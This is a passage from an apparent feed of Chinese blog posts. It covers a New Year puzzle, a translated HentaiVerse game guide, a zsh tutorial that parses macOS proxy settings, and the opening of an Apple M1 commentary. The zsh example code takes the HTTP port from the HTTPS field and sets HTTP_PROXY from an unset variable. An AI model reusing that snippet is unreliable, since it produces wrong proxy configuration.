href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/apl.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"1500\" height=\"248\" class=\"aligncenter size-full wp-image-2447\"></a>\n<p>这是 APL，一种有趣的函数式编程语言。你可能不了解它，但只要你搜索网页的 <code>title</code>，就能找到这个在线运行 APL 的页面：<a href=\"https://tryapl.org/\">TryAPL</a>。在这个页面中粘贴这段代码，即可得到 <code>https://rp.dlij.site/2021/2554038.75</code>。访问这个 URL，可以看到一张图。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021-b.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2445\"></a>\n<p>连续三年的传统艺能了，压缩包藏在了图片里。下载图片，将后缀改为 .zip 然后打开，可以看到一个 README.md。其中要求我们去 <code>ws://121.196.27.125:8080/NvAhoZ9@H2Au</code> 获取最终红包口令码。这是一个 WebSocket 协议的地址，在浏览器中开一个新 Console，执行 <code>new WebSocket('ws://121.196.27.125:8080/NvAhoZ9@H2Au')</code> 即可在 Network 选项卡中看见服务器下发的红包口令码。当然，别忘了将其反转。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/message.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"\" width=\"475\" height=\"179\" class=\"aligncenter size-full wp-image-2446\"></a>\n<h1>跨年海报</h1>\n<p>依然是传统艺能，今年的海报只用到了 PS。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/12/2021.jpg?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"2021\" width=\"720\" height=\"960\" class=\"aligncenter size-full wp-image-2407\"></a>\n<p>提前祝各位新年快乐！</p>\n","link":"https://flyhigher.top/diary/2405.html"},{"title":"[译] HentaiVerse 建议和指导","date":"2020-12-24 22:31:00","description":"\n<p>著名的同人本资源集散地 E-hentai 有一个完全没有人在意的角落 ——「HentaiVerse」，一个纯文字网页 RPG 游戏。虽然这个游戏应该不会有太多新玩家了，不过还是翻译一篇给新玩家的指导文吧。</p>\n<span></span><blockquote><p>原文标题：HentaiVerse Advice<br>原文作者：<a href=\"https://ehwiki.org/action/history/Talk:HentaiVerse_Advice\">作者列表</a><br>原文链接：<a href=\"https://ehwiki.org/wiki/HentaiVerse_Advice\">https://ehwiki.org/wiki/HentaiVerse_Advice</a><br>原文授权协议：GNU Free Documentation License 1.2+<br>本文由 <a href=\"https://skk.moe/\">Sukka</a> 翻译，首发于 <a href=\"https://blog.skk.moe/\">Sukka’s Blog</a></p></blockquote>\n<h2>译者的话</h2>\n<ul>\n<li>本文不是 HentaiVerse 新手教程文。想入新手村请左转百度贴吧「HV 网页游戏吧」置顶帖、右转 E-hentai 社区<a href=\"https://forums.e-hentai.org/index.php?showtopic=189266\">「中文指引」帖</a>。</li>\n<li>本文假设你对 HentaiVerse 有一定程度的了解。如果你不满足这个前提，请先去阅读 <a href=\"https://ehwiki.org/\">EHWiki</a>。</li>\n<li>本文的作者都是 E-hentai 社区中受人敬仰的资深玩家、亦或是 E-hentai 社区 HentaiVerse 版块的管理员，但毫无疑问这并非你唯一的玩法选择，译者本人的玩法风格就与本文的建议背道而驰（截至本文译就，译者为 360 级，装备搭配是 西洋 + 超高格挡圆盾 + 全身轻甲）。</li>\n<li>HentaiVerse 带来的收益其实很有限，尤其是当你要解锁 HentaiVerse 相关的 Hath Perks 时。不过如果你是为了赚 Credit 和 GP 才来玩 HentaiVerse 的话，之后你也不会有心思看本子的。</li>\n</ul>\n<h2>路线指导</h2>\n<h3>50 级之前</h3>\n<p>在这个阶段，你完全不必在意选择 <a href=\"https://ehwiki.org/wiki/Play_Styles/Chinese\">战士或法师</a>，也不必在乎 <a href=\"https://ehwiki.org/wiki/Fighting_Styles/Chinese\">战斗风格</a>。保持你的主属性均衡分布（译者注：即中文玩家圈口中的「水桶加点」）。此时游戏的难度和花费都是微不足道的，你可以试一试每一种玩法和风格。</p>\n<h3>51 级到 199 级</h3>\n<p>200 级以前推荐走战士的路线。<a href=\"https://ehwiki.org/wiki/Fighting_Styles#Two-Handed\">双手武器</a> + <a href=\"https://ehwiki.org/wiki/armor\">轻甲</a> 是个不错的选择，使用西洋剑和盾牌的 <a href=\"https://ehwiki.org/wiki/Fighting_Styles#One-Handed\">单手</a> 风格也值得一试。这两种玩法可以提供最佳的生存可能，因此你可以提前尝试更高的 <a href=\"https://ehwiki.org/wiki/difficulties\">难度</a>，而更高的难度意味着更好的掉落。</p>\n<p>不建议这个阶段的玩家尝试法师，因为法师是一种游走在边缘的危险玩法，如果你没有很好的装备和咒语，那么很大几率你在杀死敌人之前会先被敌人干掉。这并不是说你不能选择法师，但是你很难在更高的难度下通关。</p>\n<p>继续维持主属性均衡分布，INT 除外（译者注，一般推荐 INT 值为当前等级的 60% 到 70%，以保证足够的 SP 值用于维持灵动架势）。每 30 级左右就更换一次装备，考虑到你现在用的装备都不推荐魂绑，所以使用和你等级接近的装备显然更合适。</p>\n<h3>200 级到 319 级</h3>\n<p>怪物会因为可以使用灵力攻击而变得更强大。在这个阶段，建议用西洋剑玩单手盾战风格，西洋剑的后缀应该是「杀戮」或「平衡」，盾牌的类型则推荐力场盾、不过最关键的是盾牌的「格挡率」越高越好。这个阶段推荐使用重甲，最好是带有 Power 前缀的。「杀戮」后缀的重甲减伤一般而伤害加成更高，价格也更贵。</p>\n<p>此时仍然不推荐法师风格，因为 310 级以前你没法点满「Faster Imperil」。除非你的装备非常好，否则你必须要大量使用「Imperil」技能，而这个等级下的装备是非常昂贵的。</p>\n<h3>320 级以上</h3>\n<p>法师突然变成一个非常可行的选择。杀戮后缀的西洋剑 + 立场盾 + Power 前缀杀戮后缀重甲 也很不错。法师装备更贵、依赖 Supportive 咒语生存，但是清关的速度更快（译者注：法师清关龙场一般不会超过 2000 turn、但盾战需要至少 8000 turn）。</p>\n<h2>风格指导</h2>\n<h3>法师</h3>\n<ul>\n<li>只使用布甲和法杖</li>\n<li>法师可以施放除「虚空伤害」以外的所有伤害类型的法术</li>\n<li>可以对一片怪物造成伤害</li>\n<li>可以借助元素爆炸的优势</li>\n<li>0 干扰、极低的负重，因此魔法消耗和行动速度很快</li>\n<li>缓伤效果较差</li>\n</ul>\n<h3>战士</h3>\n<p>不论你是哪一种战士，友情小马炮永远是你最好的朋友。</p>\n<h4>轻甲</h4>\n<ul>\n<li>中等水平的缓伤、干扰、负重，低穿刺缓伤、低回避率</li>\n<li>暗影类轻甲可以提供更高的伤害加成，0 干扰，相对更高的回避率，但缓伤较低、完全不能免疫穿刺伤害</li>\n</ul>\n<h4>重甲</h4>\n<ul>\n<li>最高的缓伤效果，但是干扰和负重也最高</li>\n<li>Power 前缀的动力甲可以提供不错的伤害加成</li>\n</ul>\n<h4>单手</h4>\n<ul>\n<li>搭配盾牌可以带来不错的格挡率加成，有效提升生存率</li>\n<li>「压倒性的攻击」技能可以增加伤害、命中率和招架率</li>\n<li>反击可以增加斗气，让你可以频繁地使用「Fighting Skills」和保持住「灵动架势」</li>\n</ul>\n<h4>双持</h4>\n<ul>\n<li>对单个目标的伤害最高，适合浴血擂台（Ring of Blood）和传奇竞技场</li>\n<li>可以打出两个效果（如同时打出「眩晕」和「刺甲」）</li>\n<li>三阶段「Fighting Skills」可以击中多个目标</li>\n<li>由于没有盾牌、格挡率加成极低，只能靠回避率和招架率生存</li>\n<li>攻击速度和命中率极高，但生存率很一般</li>\n</ul>\n<h4>双手</h4>\n<ul>\n<li>「Domino Strike」可以命中多个目标</li>\n<li>易于同时攻击多个目标</li>\n</ul>\n<h4>二天一流</h4>\n<ul>\n<li>搭配日本刀 + 胁差的玩法风格</li>\n<li>同时拥有部分双手和双持的优势</li>\n<li>「Domino Strike」只能命中不超过 5 个目标</li>\n<li>副手没有招架加成</li>\n<li>适合 100 级以下的玩家或 300 级以上的玩家</li>\n</ul>\n<h2>培养方向</h2>\n<h3>技能点</h3>\n<p>这一节的内容适用于所有风格，不论是法师、战士还是战法师。</p>\n<p>不要把技能点浪费在你不主动使用的能力上（比如你是一名元素法师，就不应该加圣、暗的技能），技能只有在装配在支配槽中才会起作用。在低等级时你升级获得的技能点会远比你需要的多，但是到 200 级以后你的技能点就会不够用了。你需要通过 <a href=\"https://ehwiki.org/wiki/training\">训练</a>「Ability Boost」来获得更多的技能点。</p>\n<h4>应该加的技能</h4>\n<ul>\n<li>HP Tank（非常重要）：血条，直接决定你的生存几率</li>\n<li>MP Tank（非常重要）：蓝条，非常有用</li>\n<li>Better Cure（非常重要）：减少冷却时间、增加治疗的 HP 量。在 HentaiVerse 里 HP 药水效果一般，你会更依赖治疗咒语。</li>\n<li>Better Regen（非常重要）：提供更有效且更持久的回血</li>\n<li>Better Protection（非常重要）：极大地提升生存几率</li>\n<li>对应装备和战斗风格的技能（非常重要）：随着熟练度提升将有效提升你的任务属性</li>\n<li>Better Mana Pots（重要）：MP 药水是战斗必带的回复品</li>\n<li>Better Haste（重要）：增加你攻击、施法的速度，因此你可以攻击更多的怪物，有效提升你的生存几率</li>\n<li>Stronger Spirit（重要）：让灵力盾可以消耗更少的 SP、更早的抵御攻击</li>\n<li>SP Tanks（重要）：对于战士来说，这是保持灵动架势必备的。而灵力盾和生命火花也依赖 SP 才能发挥作用</li>\n<li>Better Shadow Veil：更高的回避率加成意味着更高的生存几率</li>\n<li>Better Imperil（可选）：削弱怪物的缓伤，对于法师来说是个不错的选择</li>\n<li>Faster Imperil（可选）：降低 Imperil 的消耗和冷却时间、增加受影响的目标，特别适合法师</li>\n<li>Better Spark（可选）：大部分玩家都会通过 IA 自动施放生命火花，此时只能帮助你减少 MP 消耗。一旦你升到 150 级以上，你就会经常看到带有 SP 条的怪物了，而怪物的 SP 攻击可以对你造成极大的伤害、甚至能秒杀你，而生命火花就是你的最后一道保障（译者注：「生命火花」类似于 Minecraft 的「不死图腾」）</li>\n</ul>\n<h4>不推荐的技能</h4>\n<ul>\n<li>Better Drain：造成的伤害非常有限</li>\n<li>Faster Drain：枯竭咒语本身的施法速度就够快了，而冷却时间却不会变短很多</li>\n<li>Better Absorb：很一般的咒语，大部分怪物并不会进行魔法攻击。只有在打 Boss 时会有点用</li>\n<li>Better Slow：Better MagNet 显然是个更合适的选择</li>\n<li>Mind Control：并没有什么用</li>\n<li>Better Blind 和 Faster Blind：Weaken 咒语效果更明显</li>\n<li>Ether Theft：对法师来说是多余的</li>\n</ul>\n<h3>法师哲学</h3>\n<p>法师是一种游走在边缘的职业，尝试在怪物秒杀你之前 秒杀他们。</p>\n<ul>\n<li>310 级以前不建议尝试</li>\n<li>依赖高伤害和回避率生存</li>\n<li>高投入、高回报</li>\n</ul>\n<h3>战士哲学</h3>\n<ul>\n<li>通过高缓伤和再生咒语生存，使用格挡、回避和招架防御。</li>\n<li>战士也需要 MP 维持 BUFF，必要时还要使用 DEBUFF</li>\n<li>200 级以前，尽量确保命中率高于 100%</li>\n</ul>\n<h2>难度调整</h2>\n<p>随着你的等级不断提升，你将会遇见更强大的怪物，战力大多都在 400 以上（拥有 SP 攻击的能力）。从 150 级开始难度就会显著增加，因此你应该适时做一些难度调整。</p>\n<ul>\n<li>尽量选择 Hard 以上难度，以便获得 Shard</li>\n<li>获得更好的装备（尤其是武器），数值比装备等级更重要</li>\n<li>多多使用 BUFF 和 DEBUFF</li>\n<li>第一个 IA 自动施法槽只需要 50H，非常非常非常非常划算的投资</li>\n</ul>\n<h2>装备</h2>\n<p>等级较低的玩家应该多逛逛 E-hentai 社区，领取免费装备和每周的补给（药水、卷轴等）。品质高的装备的属性不一定比品质低的装备好，因此选择和更换装备时三思而后行。</p>\n<h2>物品</h2>\n<ul>\n<li>药水是拿来喝的，不是拿来收藏的。</li>\n<li>喝药水和使用卷轴不计入 turn，所以为啥不多用用呢？</li>\n<li>长效药一般用于较长的战斗，普通药水用于应急，丹药（译者注：中文圈玩家一般称之为「大药」）是在紧急情况下、普通药水的冷却时间还没过、或想要同时获得两种效果时使用的。一些老玩家会给新玩家发放免费药水，去 E-hentai 社区 HentaiVerse 版块的 WTS 分区里看看？</li>\n<li>浴血擂台中 Flying Spaghetti Monster 是性价比最高的，其余的挑战通一次就够了。</li>\n<li>只有你自信能在 PFUDOR 难度打败 Triple Trio and the Tree 时再去刷。</li>\n</ul>\n<h2>怪物实验室</h2>\n<ul>\n<li>你想什么时候去看看就去，只需要记住怪物给予礼物的间隔至少为一小时，而且较弱的怪物一般很少给予礼物。</li>\n<li>如果一个怪物过去 3 天没有给你礼物的怪物，那么接下来他一定会给予你一个礼物。</li>\n<li>怪物的名字越有趣越好，不要用序号或者脸滚键盘为怪物取名。</li>\n</ul>\n<h2>雪花祭坛和奖杯</h2>\n<ul>\n<li>你可以通过献祭奖杯换取装备，也可以随时将它们卖掉。它们在雪花祭坛的价值不会改变，因此囤积它们没有实际意义。</li>\n<li>奖杯永远不要卖给系统店，要么献祭掉、要么卖给玩家（比系统店的价格要高得多）。</li>\n</ul>\n<h2>训练</h2>\n<p>训练会极大程度的消耗你的 Credits，并且除了 Adept Learner 和 Ability Boost 以外很难给你提供太多加成：将 Scavenger 训练满将会花费你 1700 万 Credit，但是掉落几率不过从 10% 提升到 12.5% 而已（译者注：在中文圈玩家中，四个增加掉落率的训练被称为「四大」，因为「四大皆空」）。</p>\n<h2>武器店和道具店</h2>\n<p>武器店里卖的装备要么等级太高、要么等级太低，不如在 社区 HentaiVerse 版块的 WTS 分区里直接向玩家购买。道具店里的东西一般很贵，WTS 版块里要便宜一些，但是去 <a href=\"https://hvmarket.xyz/\">HVMarket</a> 购买最划算。</p>\n<h2>熔炉</h2>\n<ul>\n<li>每项属性的前 5 次升级都不消耗站粘合剂，性价比高；而当你分解装备时，强化材料的 90% 原料都会返还给你，因此在低等级时升级装备还是相对划算的。</li>\n<li>叠加装备附魔不会增强效果，只会增加持续的时间。</li>\n<li>当你装备获得了不想要的潜能时，马上重新锻造它，因为每一级装备潜能意味着需要一片重铸碎片。</li>\n<li>除非你是土豪，否则不要购买灵魂碎片。每天打遭遇战可以获得至多 60 片灵魂碎片。</li>\n</ul>\n<div class=\"license\"> <div class=\"license-title\">[译] HentaiVerse 建议和指导</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/hentaiverse-advice/\">https://blog.skk.moe/post/hentaiverse-advice/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-24</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/hentaiverse-advice/"},{"title":"ZSH 自动读取 macOS 系统代理配置并设置环境变量","date":"2020-12-07 02:47:00","description":"\n<p>和其它 Linux 的 DE 一样，macOS 也支持在「系统偏好设置」中设置 HTTP 代理、HTTPS 代理，但是 macOS 并不会在终端（Terminal、iTerm）的 shell 中自动生效系统代理配置。为了方便日常使用，我决定好好研究一下 macOS 的系统代理。</p>\n<h2>macOS 系统代理的行为</h2>\n<p>和 Linux 和 Windows 只有一种系统代理配置不同，macOS 为每一种网络设备（Wi-Fi、Ethernet、Bluetooth PAN 等）维护了独立的网络配置，包括代理配置在内。因此当切换网络设备时，macOS 会使用不同的代理配置；如果同时连接了多个网络设备，则操作系统会优先采用在「系统偏好设置」网络「Service Order」靠上的设备的代理配置：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/1.png\" class=\"lazy post-img\"></p>\n<p>和大部分 Linux 桌面环境一样，系统偏好设置中的代理设置在 shell session 中是不会生效的，在终端中使用代理、需要手动提供 <code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code> 和 <code>ALL_PROXY</code> 环境变量。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.3/2.png\" class=\"lazy post-img\"></p>\n<h2>在终端获取 macOS 系统代理配置</h2>\n<p>macOS 内置了许多实用的命令行工具，如 <code>xcode-select</code> 用于安装命令行工具和配置 Xcode、<code>build_webkit</code> 用于编译 WebKit、<code>softwareupdate</code> 用于获取系统更新等。在读取系统代理配置方面，macOS 提供了三种方法：</p>\n<pre><code class=\"hljs bash\">$ system_profiler SPNetworkDataType <span class=\"hljs-comment\"># 获取完整网络配置信息</span>$ networksetup -listallnetworkservices <span class=\"hljs-comment\"># 列举所有网络设备</span>$ networksetup -getwebproxy Wi-Fi <span class=\"hljs-comment\"># 获取特定网络设备的系统代理配置</span>$ scutil --proxy <span class=\"hljs-comment\"># 获取当前已启用的代理配置，是对 system_profiler 的封装</span></code></pre>\n<p>其中，第三种命令的输出最简洁，适合在 shell 中解析：</p>\n<pre><code class=\"hljs bash\">$ scutil --proxy&lt;dictionary&gt; {  ExceptionsList : &lt;array&gt; {    0 : 127.0.0.1    1 : 192.168.0.0/16    2 : 10.0.0.0/8    3 : 172.16.0.0/12    4 : 100.64.0.0/10    5 : 17.0.0.0/8    6 : localhost    7 : *.<span class=\"hljs-built_in\">local</span>    8 : 169.254.0.0/16    9 : 224.0.0.0/4    10 : 240.0.0.0/4  }  ExcludeSimpleHostnames : 1  HTTPEnable : 1  HTTPPort : 6152  HTTPProxy : 127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<h2>解析 <code>scutil</code> 输出</h2>\n<p>虽然使用 <code>awk</code> 可以轻易解析上述输出，但是正如我在「<a href=\"https://blog.skk.moe/post/make-oh-my-zsh-fly/\">我就感觉到快 —— zsh 和 oh my zsh 冷启动速度优化</a>」一文中所介绍的，应避免使用外部进程、尽可能使用 zsh 内置语法。而应对字符串操作，zsh 也已经绰绰有余了。</p>\n<p>首先，为了获取代理配置不可避免的要生成一个 <code>scutil</code> 的子进程，为了避免子进程的反复生成，应该把输出缓存下来：</p>\n<pre><code class=\"hljs bash\">SCUTILS_PROXY=$(scutil --proxy)</code></pre>\n<p>接着判断代理是否启用。如果配置了代理，则 <code>xxEnable :</code> 的字段值为 1，反之则字段值为 0 或直接整个字段不存在，因此可以使用 zsh 字符串搜索语法搜索 <code>xxEnable : 1</code>，以 HTTP 代理为例：</p>\n<pre><code class=\"hljs bash\">HTTP_PROXY_ENABLED_PATTERN=<span class=\"hljs-string\">\"HTTPEnable : 1\"</span><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>  <span class=\"hljs-comment\"># HTTP 代理已启用</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<blockquote><p><code>(I)</code> 是 zsh 中的字符串从右往左搜索的语法，返回值为找到匹配时的位置；当没有找到匹配时，zsh 会一路搜索到字符串最左侧、最终返回值是 0。因此 <code>(I)</code> 常见的用法是配合数值条件 <code>(( ))</code> 判断变量是否包含某一字符串，这种写法的性能是 <code>[[ ]]</code> 的三倍。</p></blockquote>\n<p>接下来是获取代理的主机名和端口，HTTP 代理使用到的字段是 <code>HTTPProxy</code> 和 <code>HTTPPort</code>。使用 zsh 的「左端最小匹配截断」语法截取 <code>HTTPProxy</code> 字段内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>127.0.0.1  HTTPSEnable : 1  HTTPSPort : 6152  HTTPSProxy : 127.0.0.1  SOCKSEnable : 1  SOCKSPort : 6153  SOCKSProxy : 127.0.0.1}</code></pre>\n<blockquote><p><code>#*</code> 是「左端最小匹配截断」、<code>##*</code> 是「左端最大匹配截断」，此外还有 <code>%*</code> 和 <code>%%*</code>，分别是「右端最小匹配截断」和「右端最大匹配截断」</p></blockquote>\n<p>接下来是使用 zsh 的多行字符串语法获取第一行内容、以将右端多余的内容略去：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>127.0.0.1</code></pre>\n<blockquote><p>使用 zsh 内置的 <code>(f)</code> flag 用于多行字符串的遍历和截断，比调用外部进程 <code>head</code> 要快得多</p></blockquote>\n<p>用同样的方法获取端口字段的内容：</p>\n<pre><code class=\"hljs bash\">$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>6152</code></pre>\n<p>最后拼凑字段、添加到环境变量即可：</p>\n<pre><code class=\"hljs bash\"><span class=\"hljs-keyword\">if</span> (( <span class=\"hljs-variable\">$SCUTILS_PROXY</span>[(I)<span class=\"hljs-variable\">$HTTP_PROXY_ENABLED_PATTERN</span>] )); <span class=\"hljs-keyword\">then</span>    HTTP_PROXY_HOST=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPProxy : }</span>[(f)1]}</span>    HTTP_PROXY_PORT=<span class=\"hljs-variable\">${<span class=\"hljs-variable\">${SCUTILS_PROXY#*HTTPSPort : }</span>[(f)1]}</span>    <span class=\"hljs-built_in\">export</span> http_proxy=<span class=\"hljs-string\">\"http://<span class=\"hljs-variable\">${HTTP_PROXY_HOST}</span>:<span class=\"hljs-variable\">${HTTP_PROXY_PORT}</span>\"</span>    <span class=\"hljs-built_in\">export</span> HTTP_PROXY=<span class=\"hljs-string\">\"<span class=\"hljs-variable\">${https_proxy}</span>\"</span><span class=\"hljs-keyword\">fi</span></code></pre>\n<p>同理，用相同的方法可以获取到其它代理服务器配置。将代码添加到 <code>.zshrc</code> 中，每次新建一个 shell session 时即可自动读取并添加相关环境变量。</p>\n<h2>zsh-osx-autoproxy</h2>\n<p>基于上述介绍的方法，我封装了一个 oh-my-zsh 插件 <a href=\"https://github.com/SukkaW/zsh-osx-autoproxy\">zsh-osx-autoproxy</a>，启用插件后即可自动获取 HTTP 代理、HTTPS 代理、FTP 代理的设置，并在当前 shell 环境中添加相应环境变量（<code>HTTP_PROXY</code>、<code>HTTPS_PROXY</code>、<code>ALL_PROXY</code>、<code>FTP_PROXY</code>）。oh-my-zsh 用户可以通过下述命令完成安装：</p>\n<pre><code class=\"hljs bash\">git <span class=\"hljs-built_in\">clone</span> https://github.com/sukkaw/zsh-osx-autoproxy <span class=\"hljs-variable\">${ZSH_CUSTOM:-~/.oh-my-zsh/custom}</span>/plugins/zsh-osx-autoproxy<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"plugins+=(zsh-osx-autoproxy)\"</span> | tee -a .zshrc</code></pre>\n<p>新建一个终端会话（或使用 <code>source ~/.zshrc</code>） 即可生效。</p>\n<div class=\"license\"> <div class=\"license-title\">ZSH 自动读取 macOS 系统代理配置并设置环境变量</div> <div class=\"license-link\"><a href=\"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/\">https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/</a></div> <div class=\"license-meta\"> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">本文作者</div> <div class=\"license-meta-text\">Sukka</div> </div> <div class=\"license-meta-item\"> <div class=\"license-meta-title\">发布于</div> <div class=\"license-meta-text\">2020-12-07</div> </div>\n<div class=\"license-meta-item\"> <div class=\"license-meta-title\">许可协议</div> <div class=\"license-meta-text\"><a href=\"https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">CC BY-NC-SA 4.0</a></div> </div>\n</div>\n<div>转载或引用本文时请遵守许可协议，注明出处、不得用于商业用途！</div>\n</div>\n","link":"https://blog.skk.moe/post/macos-auto-read-proxy-settings-zsh/"},{"title":"谈谈 Apple M1 芯片、ARM、ARM Mac 和黑苹果的未来","date":"2020-11-11 16:13:00","description":"\n<p>2020 年 11 月 11 日，苹果在本年度最后一次 Apple Events 上发布了全新的 ARM 芯片 M1、以及三款搭载了 M1 的 Mac：MacBook Air、MacBook Pro 13‘ 和 Mac Mini。在 WWDC 2020 库克宣布 Apple Silicon 后，这次 Apple Events 再一次掀起了热潮，不少 KOL 都把 M1 奉若神明，不少人也不以为然。本文通过 8 个问题来简单聊聊 M1 和 ARM Mac。</p>\n<h2>M1 芯片的性能如何？</h2>\n<p>本文写就时，搭载 M1 的 Mac 尚未开始发货，我们能看到的只有 GeekBench 上流出的跑分。所以，让我们先从跑分开始看起？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/3.jpg\" alt=\"3\" width=\"1280\" height=\"901\" class=\"lazy post-img\"></p>\n<p>哇！Geekbench 跑分数据告诉我们，M1 和 A14X 可以直接打败 5950X、直接把 Tiger Lake 摁在地上摩擦？这已经不是踩爆 Intel 的牙膏了好伐，这是已经快进到 AMD 原地倒闭了好伐！给 Apple 倒一杯卡布奇诺好吗，快给 Apple 倒一杯卡布奇诺！</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/4.jpg\" alt=\"4\" width=\"965\" height=\"569\" class=\"lazy post-img\"></p>\n<p>啊，什么？这 Geekbench 还说 Intel 的 Tiger Lake 可以吊打 4700U？嗯？嗯~？</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/1.jpg\" alt=\"1\" width=\"1280\" height=\"893\" class=\"lazy post-img\"></p>\n<p>过了一个小时 Geekbench 就更新了排名数据，所以，现在 5950X 和 5900X 的分数又高过 M1 和 A14X 了？</p>\n<p>看了上面这三张图，你应该大致知道像 Geekbench 这样的跑分纯属娱乐了吧。「众所周知」跑分不代表真实体验。所以我们还是看看苹果发布会上给的图表吧：</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/2.png\" alt=\"2\" width=\"1523\" height=\"846\" class=\"lazy post-img\"></p>\n<p>什么，苹果竟然敢说自己的 M1 比最先进的 PC 芯片的性能还要强大 …… 哦，我眼睛业障重啊，这图表的标题后面、还跟着一个「Per Watt（每瓦）」啊。</p>\n<p><img src=\"https://cdn.jsdelivr.net/npm/sks@0.5.1/5.jpg\" alt=\"5\" width=\"1280\" height=\"818\" class=\"lazy post-img\"></p>\n<p>苹果的意思是，自从 Mac 实装了 M1、Mac 的功耗比直接大幅提升，苹果并没有直接说 M1 性能有多好嘛！你看看苏妈在 AMD 发布会上晒的性能图表、条形图都快超到会场外面去了，苹果你在发布会上搞这么含蓄干什么嘛！</p>\n<p>如果苹果在发布会上只强调能耗比有多么高、功耗有多么低，丝毫不提 M1 的绝对性能，甚至没有透露 M1 的频率，对于 M1 芯片的能耐和优势相信读者也有大概的猜测了。至于苹果在发布会上展示搭载了 M1 的 Mac 比往年的同系列 Mac、CPU 性能提升超过 2.8 倍乃至 3.5 倍、GPU 性能提升则有 5 至 6 倍，我会留给后面「如何评价这率先搭载 M1 的三款 Mac？」问题再谈。</p>\n<h2>对 ARM 架构的处理器性能的一瞥</h2>\n<p>从一开始我就没有怀疑苹果是否能实现用于桌面端的 ARM 芯片。苹果操刀数款移动 CPU 的经历，驾驭 ARM 自然是轻车熟路的。</p>\n<p>那么 ARM 有什么优势呢？在手机和平板上 ARM 大放异彩，近几年几乎再没有看到搭载 X86 的智能手机了；不少 IoT 设备、单片机也开始积极使用 ARM 架构；而桌面端 PC 使用 ARM 的却少之又少。从市场上来看，ARM 架构似乎更适用于低功耗、不强调性能和 CPU 密集型计算的平台，但这并不是意味着 ARM 架构本身没有用于 CPU 密集型计算的潜力。今年 6 月 22 日刷新了全球超级计算机的「TOP500」榜单、成为第一的是来自日本理化学研究所（RIKEN）的「Fugaku」（富岳）超级计算机，峰值计算速度达到 513.9 PFlops。而 Fugaku 搭载的富士通的 7nm 48C SoC 正是 ARM 架构。</p>\n<p>作为半导体行业的门外汉，我没有资格谈论 X86 的 CISC 和 ARM、MIPS 等的 RISC 之间孰优孰劣。但从历史的长河里，我们还是能从 ARM 代替 X86 的企图中略窥一二的，其中最接近成功的一次来自 Cloudflare。2017 年 8 月，Cloudflare 尝试从 Intel Skylake 的处理器（E5-2630 v4）切换到由高通提供的 Centriq 平台。从数据上来看，高通提供的平台在当时非常有吸引力：相比 Intel Skylake 的 的 12C24T 2.1GHz，高通 Centriq 平台搭载的 Falkor 核心达到了 46C46T 2.5GHz；相比 Intel 的 170W 的 TDP、高通 Falkor 的 TDP 只有 120W；与 Intel 的 AVX512 指令集对应的，高通也有自己的 NEON 指令集。</p>\n<p>虽然众多 Linux 发行版和依赖库都提供有 ARM64 版本，但是当软件时，Cloudflare 犯了难。Cloudflare 高度依赖基于 NGINX 开发的 Web Server。虽然 NGINX 本身支持 ARM64，但是 NGINX 同时使用了大量的库如用于 gzip 压缩的 zlib 和用于 TLS 的 BoringSSL；而且 